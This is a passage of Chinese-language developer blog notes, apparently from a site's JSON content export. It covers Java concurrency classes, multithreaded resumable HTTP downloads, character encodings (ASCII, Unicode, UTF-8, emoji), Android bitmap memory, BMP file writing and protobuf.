LinkedBlockingQueue是Exexutors中使用的创建线程池的静态方法中使用的参数，显然更推荐使用。主要用的是两个方法，put方法在队列满的时候会阻塞直到有队列成员被消费，take方法在队列空的时候会阻塞，直到有队列成员被放进来。官方文档提到了， LinkedBlockingQueue的吞吐量通常要高于基于数组的队列，但在大多数并发应用程序中，其可预知的性能要低一些 ， 内部的lock只能是unfair的。 在线程池(ThreadPoolExecutor)中，获取任务使用的是queue的poll方法，添加任务使用的是queue的offer方法。就是说“不堵塞” 15. AtomicXXX只是将value写成volatile，这样get就安全了，set的话直接交给Unsafe了volatile并不是Atomic操作，例如，A线程对volatile变量进行写操作(实际上是读和写操作)，B线程可能在这两个操作之间进行了写操作；例如用volatile修饰count变量那么 count++ 操作就不是原子性的。而AtomicInteger类提供的atomic方法可以让这种操作具有原子性如getAndIncrement()方法会原子性的进行增量操作把当前值加一,因为AtomicInteger的getAndIncrement方法就是简单的调用了Unsafe的getAndAddInt。 CAS还是不能解决ABA问题 在java中用AtomicStampedReference就可以了 ABA问题简单说就是两条线程1,2同时想把100改成50，这时1用CAS改好了，2因为某些问题堵住了，恰好这个时候3线程跑进来把50改成了100，这之后2结束堵塞，用CAS比较，嗯，预期是100，没错，直接CAS变成50.（然而正常情况下结果应该是100，也就是说减法操作做了两次） java.util.concurrent.atomic下包括AtomicBoolean、AtomicInteger…还有AtomicLongFiledUpdater 16. 读多写少的场景下的同步 CopyOnWriteArrayList和Collections.synchronizedList相比。在高并发前提下，前者读的性能更好，后者写的性能更好（前者的写性能极差）。CopyOnWriteArrayList与Collections.synchronizedList的性能对比。CopyOnWriteArrayList适合做缓存。 ReentrantReadWriteLock 用于针对读多写少的场景进行优化。（获得读锁后，其它线程可获得读锁而不能获取写锁 获得写锁后，其它线程既不能获得读锁也不能获得写锁） java 无锁状态、偏向锁、轻量级锁和重量级锁 17. CompletableFuture等java 8 的apiAtomicLongFieldUpdater比AtomicLong更加省内存的方式 18.ScheduledThreadPoolExecutor用于定期执行任务首先要知道的是早期（jdk1.5之前）可以使用TimerTask去定期执行任务，但是因为其内部实现是只有一条线程，所以难免会因为前面堵塞而达不到准时。ScheduledThreadPoolExecutor可以解决这个问题，主要是scheduleAtFixedRate和scheduleWithFixedDelay这两个api ScheduledThreadPoolExecutor作为线程池，内部的blockingQueue使用的是DelayedWorkQueue.DelayedWorkQueue为ScheduledThreadPoolExecutor中的内部类，它其实和阻塞队列DelayQueue有点儿类似。DelayQueue是可以提供延迟的阻塞队列，它只有在延迟期满时才能从中提取元素，其列头是延迟期满后保存时间最长的Delayed元素。如果延迟都还没有期满，则队列没有头部，并且 poll 将返回 null。DelayedWorkQueue中的任务必然是按照延迟时间从短到长来进行排序的。ScheduledFutureTask有一个compareTo，用于在队列中进行排序。其实就是看task.time，谁在前头谁上。 public ScheduledFuture&lt;?&gt; scheduleAtFixedRate(Runnable command, long initialDelay, long period, TimeUnit unit) { ScheduledFutureTask&lt;Void&gt; sft = new ScheduledFutureTask&lt;Void&gt;(command, null, triggerTime(initialDelay, unit), unit.toNanos(period)); } public ScheduledFuture&lt;?&gt; scheduleWithFixedDelay(Runnable command, long initialDelay, long delay, TimeUnit unit) { ScheduledFutureTask&lt;Void&gt; sft = new ScheduledFutureTask&lt;Void&gt;(command, null, triggerTime(initialDelay, unit), unit.toNanos(-delay)); } //而在ScheduledFutureTask中定时任务是这样设置下一次执行时间的 private void setNextRunTime() { long p = period; if (p &gt; 0) time += p; else time = triggerTime(-p); //当前时间+period。而走到这里，run方法已经走过了，所以如果run堵塞了很久，这个task的下一次执行时间就会不准了 } 结论就是scheduleWithFixedDelay可能会因为前面的任务堵塞造成不是那么准 参考 看起来 ReentrantLock 无论在哪方面都比 synchronized 好 Jesse Wilson - Coordinating Space and Time 一级缓存，时钟周期volatile硬件层面的实现原理 StampedLock in Java Java 8 StampedLocks vs. ReadWriteLocks and Synchronized 死磕java系列","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"},{"name":"concurrency","slug":"concurrency","permalink":"https://haldir65.github.io/tags/concurrency/"}]},{"title":"多线程断点续传原理及实现","date":"2017-08-01T22:19:31.000Z","path":"2017/08/01/2017-08-01-mutithread-downloader/","text":"主要讲一下在java中(平台并不限于android)实现多线程断点续传的原理,主要讲断点下载的原理。 其实就是在Http请求里面加上一个”range”的header，HttpUrlConnection可以这么干： conn.setRequestProperty(&quot;Range&quot;, &quot;bytes=&quot; + 500 + &quot;-&quot; + 1000); 也就是告诉服务器上次下载到的位置，本地写文件可以使用RandomAccessFile。本地需要记录下上次中断后停下来的位置。可以用db记录，也可以用sp记录。实践中肯定要发两次请求，第一次是为了读content-Length，确定每一份下载任务需要下载多少bytes。第二步，就是根据线程数量，总数除以线程数，用一个线程池(或者直接开多条线程)去执行这么多份任务。每一份任务的请求都要带上上面那个Range的Header。 nginx里面可能要设置一下,当然前提是下载服务本身支持range请求 proxy_cache_key $host&amp;uri&amp;is_args&amp;args$http_range; proxy_set_header Range $http_range; proxy_set_header If-Range $http_if_range; proxy_cache_valid 200 206; proxy_set_header就是Nginx在将请求传递给server的时候添加一些header，可以是文本，变量或者是二者的组合可能还涉及到一些proxy_cache模块的原理 另外这种情况下的http response header应该是206 Partial Requests,印象中网易云音乐网页端听歌的媒体文件是partial request HTTP文件断点续传的原理其实要注意的是，断点续传，下次开始下载前，需要根据ETag判断下服务器上的这个文件是否更改过了，如果改过了 httpURLConnection.getHeaderField(“ETag”); httpURLConnection.getHeaderField(“ETag”); //这是从零开始下载的时候获取Etag，本地保存 httpURLConnection.setRequestProperty(“If-None-Match”, “b428eab9654aa7c87091e”); // 下载恢复之后，重新发请求，如果后返回一个304的状态码，那么可以继续执行。如果发生了更改，那么需要使用新的资源重新下载。 这里面的难点在于多线程同步问题，高效率锁。还得要使用ArrayBlockingQueue。 1. 获取要下载的内容的contentLengthHttpUrlConnection有一个connection.getContentLength()方法，用于获取内容大小(bytes) 2. 大文件上传避免oomCaused by java.lang.OutOfMemoryError: Failed to allocate a 65548 byte allocation with 32012 free bytes and 31KB until OOM at com.android.okio.Segment.&lt;init&gt;(Segment.java:37) at com.android.okio.SegmentPool.take(SegmentPool.java:48) at com.android.okio.OkBuffer.writableSegment(OkBuffer.java:511) at com.android.okio.OkBuffer.write(OkBuffer.java:424) at com.android.okio.OkBuffer.clone(OkBuffer.java:740) at com.android.okhttp.internal.http.RetryableSink.writeToSocket(RetryableSink.java:77) at com.android.okhttp.internal.http.HttpConnection.writeRequestBody(HttpConnection.java:263) at com.android.okhttp.internal.http.HttpTransport.writeRequestBody(HttpTransport.java:84) at com.android.okhttp.internal.http.HttpEngine.readResponse(HttpEngine.java:790) at com.android.okhttp.internal.http.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:405) at com.android.okhttp.internal.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:349) at com.android.okhttp.internal.http.HttpURLConnectionImpl.getResponseCode(HttpURLConnectionImpl.java:517) at com.android.okhttp.internal.http.DelegatingHttpsURLConnection.getResponseCode(DelegatingHttpsURLConnection.java:105) 参考 con.setChunkedStreamingMode(1024);//内部缓冲区—分段上传防止oomHttpURLConnection教程上传的时候不走HttpUrlConnection，直接创建Socket模拟POST避免大文件OOM 3. 现有的实现方案非常优秀的library，英语流利说喜欢搞多进程。Aspsine英语流利说下载文件的本质是inputstream.read 4.简单的实现一种朴素的想法是，判断当前系统有多少可用cpu，启动对应数量的线程。比方说cpu4核心，需要下载61MB的文件，那么三条线程分别下载15MB文件，第四条线程下载16MB文件。每条线程在读取一次后，通过锁通知外部监听。每条线程下载完成后通知外部检查是否已经完成。暂停，恢复下载。这俩是相对应的，每个tasK在运行的时候监测全局的状态，在发现状态变为暂停的时候，本地持久化当前进度(sql或者文件) 参考 简书 Demo MultiThreadDownload for Android csdn 断点上传麻烦点，要自己搭server","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"二进制编码总结","date":"2017-07-30T17:45:51.000Z","path":"2017/07/30/2017-07-30-decoding-the-secret-of-binary/","text":"OkHttp作者Jesse Wilson在2016 Droidcon NYC上作了一篇关于编码的演讲，十分有趣。对于了解计算机基础非常有用，结合着写一些关于这方面的笔记。 1.重新学习Java基本数据类型基本数据类型之间的转换初学java的时候都说没必要记住各种基本数据类型的大小范围。这里补上一些： 这些范围都是闭区间 byte：8位，最大存储数据量是255，存放的数据范围是[-128,127]间, singed。 short：16位，最大数据存储量是65536，数据范围是[-32768~32767]之间,signed。 int(整数)：32位，最大数据存储容量是2的32次方减1，数据范围是负的2的31次方到正的2的31次方减1。[-2^31, 2^31-1],singed。 long(长整数)：64位，最大数据存储容量是2的64次方减1，数据范围为负的2的63次方到正的2的63次方减1。[-2^63,2^63-1],signed。 float(单精度数)：32位，数据范围在3.4e-45~1.4e38，直接赋值时必须在数字后加上f或F。unsigned。//这个范围只是正数部分的 double(双精度数)：64位，数据范围在4.9e-324~1.8e308，赋值时可以加d或D也可以不加。unsigned。 //这个范围是正数部分的 boolean：只有true和false两个取值。 char：16位，存储Unicode码，用单引号赋值。 这个表的顺序是有道理的，byte-&gt;short-&gt;int-&gt;long这类表示的都是整数（不带小数点的）;float-&gt;double这类表示的都是浮点数(计算机里没有小数点，都是用类似科学计数法来表示的); 后面这俩比较特殊：boolean只有两个值;char专门用来表示Unicode码，最小值是0，最大值是65535(2^16-1); (这个范围是严格限定的，比如byte a = 127都没问题，byte a = 128 立马编译有问题。)另外，char是为数不多的可以在java IDE里面像python一样写单引号的机会：char c = ‘1’ // okchar c = ‘12’//错误char c = 12 //正确 当一个较大的数和一个较小的数在一块运算的时候，系统会自动将较小的数转换成较大的数，再进行运算。这里的大小指的是基本类型范围的大小所以(byte、short、char) -&gt; int -&gt; long -&gt; float -&gt; double这么从小往大转是没有问题的。编译器自动转，所以经常不会被察觉。byte、short、char这三个是平级的，相互转换也行。试了下, byte b = 3; char c = &#39;2&#39;; short s = 23; s = b; //只有byte往上转short是自动的 b = (byte) s; s = (short) c; c = (char) s; b = (byte) c; c = (char) b; 强转就意味着可能的精度损失。 所以除去boolean以外: char byte,short,int,long float,double可以分成这三类，从小往大转没问题，同一类从小到大转没问题。 具体到实际操作上： char-&gt;byte-&gt;short-&gt;int-&gt;long-&gt;float-&gt;double 有一个操作数是long，结果是long 有一个操作数是float,结果是float 有一个操作数是double，结果是double long l = 424323L ,后面的L要大写。 这些整数都是没办法表示一个小数的，要用float或者double，后面加上f（F）或者L。 char(16位)，能表示的范围大小和short一样，是用单引号括起来的一个字符(可以是中文字符)，两个字符不行。 char的原理就是转成int，根据unicode编码找到对应的符号并显示出来。 两个char相加，就是转成int之后两个int相加 double类型后面可以不写D float后面写f或者F都一样 2. Java中注意的点java编译器将源代码编译位字节码时，会用int来表示boolean(非零表示真)byte,short,int,long这些都是有符号的整数，八进制数以0开头，十六进制数字以0x开头java7 开始 ，可以直接在代码里写二进制数，例如：205 = 0b110_1101 3. Encoding解释 hexadecimal 十六进制 Decimal 十进制 Octal 八进制 3.1 用二进制表示(0,1)任何文字的能力数据的发送方和接收方对传输数据的结构类型达成一致，即(Encoding)。 8 bit = 1 Byte (为什么是8，据说60年代是6)，8bit能够表达的范围也就是2^8 = 0-256.1967年，ASCII码诞生，即American Standard Code for Information Interchange，即将Byte转成文字的一张表。ASCII只用了7个bits，原因是当时硬件很贵。所以就能够表示128个字符。随便找了下这张表 例如0表示NULL, 65表示A(大写),93表示标点符号”]”。举例：单词Donut的每一个字母对应的ASCII分别是：十进制 ：68 111 110 117 116二进制: 01000100 01101111 01101110 01110101 01110100所以这么发送出去，接收者就知道是Donut了 3.2 可是128个字符不足以表示世界上所有的文字 Charset 字符集1991年出现Unicode，用于表示所有的字符，所有语言的每一个字符都能有一个唯一的id（数字）。为了能够表达这么大的一个范围，所以得多用点内存，于是UTF-16(16-bit Unicode Transformation Format)出现了，每一个字符都得用2bytes来表示。至于这张表的范围,2^16 = 65536(好熟悉的数字)，这也就是java的char类型的来源，char的定义就是16位Unicode字符。这样做有一个显然的缺陷。Unicode是ASCII的超集，D在ASCII中只要 01000100，在Unicode中却要在前面补上毫无意义的8个0，浪费了空间。（一般情况下，ASCII编码是1个字节，而Unicode编码通常是2个字节） Unicode的不同版本和平面（wiki上说2018年最新版的unicode已经收纳了15万个字符）Unicode目前普遍采用的是UCS-2，用两个字节表示一个字符，那么最多能表示2的16次方，也就是65536个字了。（15万个字符怎么来的：65536个放在U+0000到U+FFFF，剩下的字符都放在辅助平面（缩写SMP），码点范围从U+010000一直到U+10FFFF。） Unicode只有一个字符集，中、日、韩的三种文字占用了Unicode中0x3000到0x9FFF的部分Unicode目前普遍采用的是UCS-2,它用两个字节来编码一个字符, 比如汉字”经”的编码是0x7ECF,注意字符编码一般用十六进制来 表示,为了与十进制区分,十六进制以0x开头,0x7ECF转换成十进制 就是32463,UCS-2用两个字节来编码字符,两个字节就是16位二进制, 2的16次方等于65536,所以UCS-2最多能编码65536个字符。 编码从0到127的字符与ASCII编码的字符一样,比如字母”a”的Unicode 编码是0x0061,十进制是97,而”a”的ASCII编码是0x61,十进制也是97, 对于汉字的编码,事实上Unicode对汉字支持不怎么好,这也是没办法的, 简体和繁体总共有六七万个汉字,而UCS-2最多能表示65536个,才六万 多个,所以Unicode只能排除一些几乎不用的汉字,好在常用的简体汉字 也不过七千多个,为了能表示所有汉字,Unicode也有UCS-4规范,就是用 4个字节来编码字符,不过现在普遍采用的还是UCS-2，只用两个字节来 编码 在wiki里面是这么写的: 在表示一个Unicode的字符时，通常会用“U+”然后紧接着一组十六进制的数字来表示这一个字符。在基本多文种平面（英文：Basic Multilingual Plane，简写BMP。又称为“零号平面”、plane 0）里的所有字符，要用四个数字（即两个char,16bit ,例如U+4AE0，共支持六万多个字符）；在零号平面以外的字符则需要使用五个或六个数字。 所以一个正儿八经的Unicode 的写法是U+4AE0 春节这俩字，查表U+6625 U+8282 浏览器里涉及编码的函数有三个:escape(废弃，不要用)encodeURI() //输出utf-8格式，并在每个字节前加上%encodeURIComponent() //对uri的组成部分进行编码，同时在每个字节前面加上%，但是一些encodeURI不编码的字符，比如“/:#”，encodeURIComponent也编码了,encodeURIComponent不管页面编码是什么，统一返回utf-8 实测如下（春节的对应unicode字符集是0x6625 0x8282，用utf-8表示的话应该是） escape(“春节”)“%u6625%u8282” //和上面查表的结果一致，这里面的数字是16进制encodeURI(“春节”)“%E6%98%A5%E8%8A%82” //也是16进制encodeURIComponent(‘春节’)“%E6%98%A5%E8%8A%82” 许多在线utf-8转换网站粘贴进去的效果是这样的春节 -&gt; utf-8&#x6625;&#x8282; ##感觉这还只是unicode啊， 这个奇怪的&amp;#x表示后面跟着的是16进制。「&amp;#」开头的后接十进制数字，以「&amp;#x」开头的后接十六进制数字python3中测试 &#39;春节&#39;.encode(&#39;utf-8&#39;) b&#39;\\xe6\\x98\\xa5\\xe8\\x8a\\x82&#39; ##和上面那个encodeURIComponent的方法的结果是不是一样一样的。 b&#39;\\xe6\\x98\\xa5\\xe8\\x8a\\x82&#39;.decode(&#39;utf-8&#39;) &#39;春节&#39; b&#39;\\u6625\\u8282&#39;.decode(&#39;unicode-escape&#39;) python3里面这些\\x和\\u是这样的在bytes中，无法显示为ASCII字符的字节，用\\x##显示,\\u是unicode的转义字符，就是说这后面跟的都是字符的十六进制的unicode表示形式。Python对bytes类型的数据用带b前缀的单引号或双引号表示：x = b’ABC’ 下面的方法可以获得汉字的unicode值和utf-8编码 ##utf-8编码 &gt;&gt;&gt; u&#39;春节&#39;.encode(&#39;utf-8&#39;) ## unicode转utf-8，解码就是decode了 &#39;\\xe6\\x98\\xa5\\xe8\\x8a\\x82&#39; ## unicode字符码 &gt;&gt;&gt; u&#39;春节&#39; u&#39;\\u6625\\u8282&#39; ## 春节的Unicode就是U+6625 U+8282 ` 但还是没法表示一些特殊字符，例如Emoji,Dount Emoji的id是127,849。原因是90年代的设计者没有想到今天会出这么多emoji。解决办法是”surrogate pairs”。下面解释：java的String其实不过是一个char Array的wrapper，如果在ide里面看的话，String里面的char[]每个数字都代表这个位置的Unicode id。所以经常在IDE里debu看到String里面有char[],1=”67”；2=“79”。。。这种东西，其实也就是这个String（字符串）中对应位置的字符的unicode码。对于Emoji，会用两个char来表示。如何确定相邻的两个字符应该用来表示一个Emoji而是两个独立的字符？去看Emoji的Unicode表的话，这四个byte连在一起一般长这样： \\xF0\\x9F\\x98\\x81 \\xF0\\x9F\\x98\\x82 \\xF0\\x9F\\x98\\x83 \\xF0\\x9F\\x98\\x84 中间那个\\x9F\\x98就是surrogate pairs的标志所以，要认识到char本身还是不足以表示所有的字符这样的代码要是拿来打印Emoji，只会讲原本4byte的Emoji拆成2个char，所以就在console里面看到一些乱码。 String s = &quot;一些包含Emoji的文字&quot; for(int i =0 ,size = s.length();i&lt;size;i++){ char c = s.charAt(i); System.out.println(&quot;The Character at %d is &#39;%c&#39;%n&quot;,i,c); } 处理emoji的正则，主要是python提供了一个扫描出emoji的正则 def test_emoji(): try: # Wide UCS-4 build myre = re.compile(u&#39;[&#39; u&#39;\\U0001F300-\\U0001F64F&#39; u&#39;\\U0001F680-\\U0001F6FF&#39; u&#39;\\u2600-\\u2B55]+&#39;, re.UNICODE) except re.error: # Narrow UCS-2 build myre = re.compile(u&#39;(&#39; u&#39;\\ud83c[\\udf00-\\udfff]|&#39; u&#39;\\ud83d[\\udc00-\\ude4f\\ude80-\\udeff]|&#39; u&#39;[\\u2600-\\u2B55])+&#39;, re.UNICODE) sss = u&#39;I have a dog \\U0001f436 . You have a cat \\U0001f431 ! I smile \\U0001f601 to you!&#39; print(sss) print(myre.sub(&#39;[Emoji]&#39;, sss)) # 替换字符串中的Emoji print(myre.findall(sss)) # 找出字符串中的Emoji 正确的做法是: String s = &quot;一些包含Emoji的文字&quot; for(int i =0 ,size = s.length();i&lt;size;){ int c = s.codePointAt(i); System.out.println(&quot;The Caharacter at %d is &#39;%c&#39;%n&quot;,i,c); i+=Character.charCount(c);//正确识别char数量 } 汉字用UTF-8编码的话，有些还是会超出两个字节的，比如“𠮷”，wiki给这货的解释。十进制是134071，已经超出两个字节(65536)了。转成十六进制的话就是“F0 A0 AE B7”，utf-8本身就是可变长度的编码format，所以这货占了4个字节也正常。 String w = &quot;\\uD842\\uDFB7&quot;; //这个“\\u”是ide自己加上去的，注意和上面的十六进制不一样，是因为utf-8前面要加一些0,1什么的 System.out.println(String.valueOf(hex)); // 134071 for (int i = 0,size = w.length(); i &lt;size;) { int c = w.codePointAt(i); System.out.println(String.format(&quot;The character at %d is %c &quot;, i, c)); //成功打印出这个汉字 i += Character.charCount(c); } 3.3 UTF-8出现8-bit Unicode Transformation Format于1998年出现，之前提到了2个byte表示一个字符实在太浪费了，utf-8的做法是将每个字符所需要的长度变成可变的。WIKI上UTF-8的描述 多数字符只用1byte，有些用到2,3个byte，Donut的Emoji用4bytes. &lt;=7个bit的（ASCII）： 0XXXXXX (我用X表示可以被填充的空间)&lt;=11个bit ：110XXXXX 10XXXXXX (第一个byte以110开头，后面以10开头)&lt;=16个bit : 1110XXXX 10XXXXXX 10XXXXXX (第一个byte以1110开头，后面跟两个10开头的bytes)&lt;=21个bit : 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX (第一个byte以11110开头，后面跟三个10开头的bytes) 00000000 – 0000007F: 0xxxxxxx00000080 – 000007FF: 110xxxxx 10xxxxxx00000800 – 0000FFFF: 1110xxxx 10xxxxxx 10xxxxxx00010000 – 001FFFFF: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 现在来看看网上那些常用的中文转UTF-8工具怎么用，随便找一个找一个站长之家输入“美” ，对应的utf-8编码是”&amp;#x7F8E”，转Unicode是”\\u7f8e”查了下“美”这个字还真是“7F8E”。这里有张比较好的表格。二进制转unicode直接粘贴到这里的转16进制就可以了。转utf-8的话，来看这个其实是15个bit。所以这样写 7F8E显然是16进制，转成十进制是32654。 转成二进制是11111111 0001110(注意只有15个bit,前面8个1)。 转utf-8的时候，从后往前往上面的XXXX里面填充 1110XXXX 10XXXXXX 10XXXXXX就变成了 1110X111 10111110 10001110（注意有一个位置还空着） X用0补上，最终得到汉字&quot;美&quot;的utf-8二进制编码 11100111 10111110 10001110 读取的时候 1111 111100 01110(7f8e) ，这三个byte就代表汉字”美”。 Integer.toBinaryString提供了将一个int(十进制)转成二进制字符的方法,即给一个十进制数字，转成”01010101110101”这样的String，方便看懂。 即转成一大堆”0101010110”来试一下，看怎么获得这些”01010101110101”. public static void main(String[] args) { String s = &quot;美&quot;; char[] array = s.toCharArray(); for (int i = 0,size = array.length; i &lt; size; i++) { System.out.println(array[i]); System.out.println(Integer.toBinaryString(array[i])); } } //输出 111111110001110 古人诚不我欺也反过来，用一大堆”0101010111010”也能在java代码里写一个汉字出来 char c = 0b111111110001110; String ns = new String(new char[]{c}); System.out.println(ns); 0b是java 1.7开始可以使用的用来直接在代码里写二进制的方式。so if you want improve the cooleness of your code…当然java早就准备好了相应的方法(二进制-八进制-十进制-十六进制)之间的互相转化 十进制转成十六进制： String Integer.toHexString(int i) 十进制转成八进制 String Integer.toOctalString(int i) 十进制转成二进制 String Integer.toBinaryString(int i) 十六进制转成十进制 Integer.valueOf(&quot;FFFF&quot;,16).toString() //不能处理带前缀的情况 0x 八进制转成十进制 Integer.valueOf(&quot;76&quot;,8).toString() //前缀0可以被处理 二进制转十进制 Integer.valueOf(&quot;0101&quot;,2).toString() String还有一个getByte(Charset)方法，可以传各种charset进去，i/o强调的是读写使用的都是相同的编码，否则就会出现乱码。 4.接下来讲颜色颜色就是RGB的组合,屏幕中每一个像素都是由三个subPixel组成的(分别是红绿蓝)，所以在ps里面经常会碰到255,XXX,XXX这种东西。0,0,0代表全黑，255,255,255(0-256也就是一个byte能够表达的范围)代表纯白。其他的颜色都是这三种颜色的组合，所以用三个byte就能表达一种颜色。所以经常在java代码里看到： view.setBackgroundColor(Color.parseColor(&quot;#87CEFA&quot;));//三个bytes //或者 Color.RED //还有更好玩的 tv.setTextColor(Color.rgb(255, 255, 255)); //&quot;#XX XX XX&quot; 十六进制，256的范围，只需要2位数字就好了，所以总是看到00,01,10,...ff这样 在xml里面是这样的 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;resources&gt; &lt;color name=&quot;wl_blue&quot;&gt;#2878ff&lt;/color&gt; &lt;color name=&quot;wl_gray&quot;&gt;#c1c1c1&lt;/color&gt; &lt;color name=&quot;text_color&quot;&gt;#434343&lt;/color&gt; &lt;/resources&gt; 只不过少写了0x而已关于十六进制，多说一点 Colors: #ffffff URL escaping:http://example.com/?q=hello%20world Unicode code points: U+2020 ipv6地址： 2001∶0d02∶0000∶0000∶0014∶0000∶0000∶0095 都是十六进制(Dexadecimal)的应用 5.有了颜色就有了图片3个小像素组成一个像素，屏幕上无数个像素(颜色的点,每个像素大小为3bytes)组成了图片，图片只是一个颜色的2维数组(数组的每个元素是一个颜色)。那么一张6464pixel的图标大小为，64643 = 12 288bytes，现在的屏幕动辄百万像素，19801080的图片，大小是198010803 = 6.4MB。现在明白Android上图片为什么这么容易oom了吧。这还只是rgb，其实正规图片应该还有一个Alpha，即ARGB,好了，这下占用了192010804 = 8MB。所以Android在Bitmap里面提供了一些选项： BitMap.config.ALPAH_8 ：只存储透明度，不存储颜色信息 BitMap.config.ARGB_4444(Deprecated) ：Each pixel is stored on 2 bytes. (节省了一半) BitMap.config.ARGB_8888 : Each pixel is stored on 4 bytes. Each channel (RGB and alpha for translucency) is stored with 8 bits of precision (256 possible values.) This configuration is very flexible and offers the best quality. It should be used whenever possible.这也就是上面提到的一个像素三个小像素外加一个透明度的算法。 Bitmap.Config RGB_565： Each pixel is stored on 2 bytes and only the RGB channels are encoded。(能这么省是因为这里面用5bit表示red，6bit表示green，5bit表示blue，这个划分似乎是UI行业的标准，用了一些近似算法。所以经常看到有人拿着两张ARGB_8888和RGB_565的图片来比较，然后批判RGB_565颜色不准)。RBG_565本来就不是冲着颜色准确去的。其实还有RBG_232这种更加不准确的。 日常开发都是用的ARGB_8888,一个像素要用4bytes内存，所以bitmap真的非常耗内存。公式在cpp源码中 if (willScale &amp;&amp; decodeMode != SkImageDecoder::kDecodeBounds_Mode) { scaledWidth = int(scaledWidth * scale + 0.5f); scaledHeight = int(scaledHeight * scale + 0.5f); } 最终的大小就是 scaledWidthscaledHeight4 一张522*686的PNG 图片，我把它放到 drawable-xxhdpi 目录下，在三星s6上加载，占用内存2547360B，其中 density 对应 xxhdpi 为480，targetDensity 对应三星s6的密度为640： （实际长/xxxhdpi文件夹对应的值） 手机dpi (实际宽/xxxhdpi文件夹对应的值) 4522/480 640 686/480 640 * 4 = 2546432B（同样一张图片，放在xxxhdpi占用内存&lt; 放在xxhdpi &lt; 放在xhdpi,经验之谈，放在xxxhdpi是一种降低内存占用的方式） 一篇研究bitmap存储位置的文章，讲到cpp层。 找到了cpp层调用java层的gVMRuntime_newNonMovableArray方法:至少到了7.0还是通过jni把像素这个数据大户放到了java heap上面 android::Bitmap* GraphicsJNI::allocateJavaPixelRef(JNIEnv* env, SkBitmap* bitmap, SkColorTable* ctable) { jbyteArray arrayObj = (jbyteArray) env-&gt;CallObjectMethod(gVMRuntime, gVMRuntime_newNonMovableArray, gByte_class, size); return wrapper; } Android Bitmap变迁与原理解析（4.x-8.x）谈到了这一块的分配非常乱 根据Dianne Hackborn的解释 A Bitmap is just an interface to some pixel data. The pixels may be allocated by Bitmap itself when you are directly creating one, or it may be pointing to pixels it doesn’t own such as what internally happens to hook a Canvas up to a Surface for drawing. (A Bitmap is created and pointed to the current drawing buffer of the Surface.) 看下java层的bitmap的成员变量，并没有什么特别大的数组，所以真正的像素数据的存储不是放在bitmap这个对象里的。 根据懂c++人的分析，通过调用jni的CallObjectMethod来调用gVimRuntime的gVMRuntime_newNonMovableArray方法来创建一个数组，这个数组类型和长度分别用gByte_class和size表示。CallObjectMethod函数返回一个jbyteArray，此时，在Java层已经创建了一个长度为size的byte数组。 也就符合official document中说的 the pixel data is stored on the Dalvik heap along with the associated bitmap. 说法了。我的理解是，庞大的像素数据是放在java层的，因为是直接gVimRuntime进行调用gVMRuntime_newNonMovableArray来创建的，并不会对开发者暴露这个数组的直接引用(直接乱改也不好吧)，而是使用bitmap这个对象进行间接操作。官方文档其实也更新了: From Android 3.0 (API level 11) through Android 7.1 (API level 25), the pixel data is stored on the Dalvik heap along with the associated bitmap. In Android 8.0 (API level 26), and higher, the bitmap pixel data is stored in the native heap. 6.来看一张图片是怎么写出来的(在文件系统中)我这里直接把Jesse Wilson的代码复制过来，大意就是写一个bmp文件的方法，先写文件头，然后从那个int[][]中读取数组，写进一个文件，也就得到一个.bmp文件了。文件就是这么写的。 public final class Bitmap { private final int[][] pixels; public Bitmap(int[][] pixels) { this.pixels = pixels; } /** https://en.wikipedia.org/wiki/BMP_file_format */ public void encode(BufferedSink sink) throws IOException { int height = pixels.length; int width = pixels[0].length; int bytesPerPixel = 3; int rowByteCountWithoutPadding = (bytesPerPixel * width); int rowByteCount = ((rowByteCountWithoutPadding + 3) / 4) * 4; int pixelDataSize = rowByteCount * height; int bmpHeaderSize = 14; int dibHeaderSize = 40; // BMP Header sink.writeUtf8(&quot;BM&quot;); // ID. sink.writeIntLe(bmpHeaderSize + dibHeaderSize + pixelDataSize); // File size. sink.writeShortLe(0); // Unused. sink.writeShortLe(0); // Unused. sink.writeIntLe(bmpHeaderSize + dibHeaderSize); // Offset of pixel data. // DIB Header sink.writeIntLe(dibHeaderSize); sink.writeIntLe(width); sink.writeIntLe(height); sink.writeShortLe(1); // Color plane count. sink.writeShortLe(bytesPerPixel * Byte.SIZE); sink.writeIntLe(0); // No compression. sink.writeIntLe(16); // Size of bitmap data including padding. sink.writeIntLe(2835); // Horizontal print resolution in pixels/meter. (72 dpi). sink.writeIntLe(2835); // Vertical print resolution in pixels/meter. (72 dpi). sink.writeIntLe(0); // Palette color count. sink.writeIntLe(0); // 0 important colors. // Pixel data. for (int y = height - 1; y &gt;= 0; y--) { int[] row = pixels[y]; for (int x = 0; x &lt; width; x++) { int pixel = row[x]; sink.writeByte((pixel &amp; 0x0000ff)); // Blue. sink.writeByte((pixel &amp; 0x00ff00) &gt;&gt; 8); // Green. sink.writeByte((pixel &amp; 0xff0000) &gt;&gt; 16); // Red. } // Padding for 4-byte alignment. for (int p = rowByteCountWithoutPadding; p &lt; rowByteCount; p++) { sink.writeByte(0); } } } public void encodeToFile(File file) throws IOException try (BufferedSink sink = Okio.buffer(Okio.sink(file))) { encode(sink); } } 这里没有考虑压缩算法。这里面还有Big Ending和Small Ending的处理。Big Ending： 拿32bit ，一次读8bit，从左到右Little Ending: 拿32bit ,一次读8bit，从右到左读 7.从json到protoBuffer以及http2一般我们看到的json是这样的 { &quot;price&quot;: 14, &quot;gender&quot;: true, &quot;height&quot;: 1.65, &quot;grade&quot;: null, &quot;time&quot;: ,&quot;2016-09-30T18:30:00Z&quot; } 注意那个事件戳，时间戳本可以用long(8bytes)表示，这上面的String的每个字符都在英文或者阿拉伯数字，所以在ASCII内，所以一个字符按照utf-8编码的话也就1byte，一个个数下来也有二十多个bytes。从8bytes到二十多个bytes，浪费了一半多的bits。数据量越大，编码越慢，传输越慢，解码越慢。 来看protocolBuffer，protocolBuffer一般长这样，每一个field都有一个独一无二的tag. message Person { required string name = 1; required int32 id = 2; optional string email = 3; enum PhoneType { MOBILE = 0; HOME = 1; WORK = 2; } message PhoneNumber { required string number = 1; optional PhoneType type = 2 [default = HOME]; } repeated PhoneNumber phone = 4; } 以 optional string email = 3 